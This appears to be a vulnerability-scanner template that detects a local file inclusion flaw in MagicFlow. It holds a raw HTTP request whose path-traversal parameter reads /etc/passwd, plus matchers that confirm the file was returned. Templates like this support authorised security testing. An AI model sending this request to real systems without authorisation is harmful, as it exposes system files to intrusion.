id: magicflow-lfi1
info:
  author: gy741
  name: MagicFlow - Local File Inclusion
  reference: https://www.seebug.org/vuldb/ssvid-89258
  severity: critical
  tags: magicflow,lfi
http:
- matchers:
  - regex:
    - root:.*:0:0
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=msagroup.txt+downLoadFile=../../../../../../etc/passwd
    HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0

    Accept-Encoding: gzip, deflate

    Accept: */*

    '
